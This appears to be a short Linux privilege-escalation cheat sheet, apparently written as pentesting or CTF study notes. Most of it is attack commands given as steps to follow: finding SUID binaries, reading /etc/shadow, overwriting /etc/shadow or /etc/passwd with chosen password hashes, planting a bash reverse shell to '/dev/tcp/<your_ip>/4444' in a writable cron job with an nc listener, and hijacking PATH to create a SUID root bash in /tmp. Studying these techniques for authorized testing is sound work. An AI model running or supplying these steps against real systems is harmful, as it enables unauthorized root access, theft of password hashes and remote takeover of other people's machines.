https://gtfobins.github.io/
List of Unix binaries that can used to bypass local security restrictions in misconfigured systems

---------------------------

https://www.exploit-db.com/
Search for exploits.

  Check system information (if old kernel for example)
  $uname -a
  $lsb_release
  
  Check HW info
  $sudo lshw (-short)

  Check block device info
  $lsblk

---------------------------

List the allowed (and forbidden) commands
$sudo -l	

---------------------------

Check SUID(Set owner User ID upon execution), which will provide special type of file permissions given to file
$find / -user root -perm /4000 2>/dev/null	
$find / -perm -u=s -type f 2>/dev/null
$find / -user root -perm -4000 -print 2>/dev/null
$find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

Look for a known exploit for this version of exim. Exploit-DB, Google, and GitHub. Might be a script.


---------------------------

Check if readable /etc/shadow (file contains user password hashes, usually readable only by root)

>ls -l /etc/shadow
>cat /etc/shadow

Check if writable /etc/shadow (usually readable only by root)

>mkpasswd -m sha-512 <your_password>
Edit the shadow files first :....:

---------------------------

Check if /etc/passwd file is world-writable (contains information about user accounts, usually readable only by root)

> ls -l /etc/passwd
> openssl passwd <your_pw>
> edit the passwd files first :....:

---------------------------

Check crontab

Cron Jobs file permission

> cat /etc/crontab

Locate the job
> locate <job>

Check if writable
> ls -l <file_path>

Edit the job with:
#!/bin/bash
bash -i >& /dev/tcp/<your_ip>/4444 0>&1

Start netcat listener
> nc -nvlp 4444

---------------------------

PATH environment variable

if the PATH variable starts with /home/user 
you could create <job> named file to /home/user

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

make it executable
>chmod +x /home/user/<job>.sh

>/tmp/rootbash -p

---------------------------
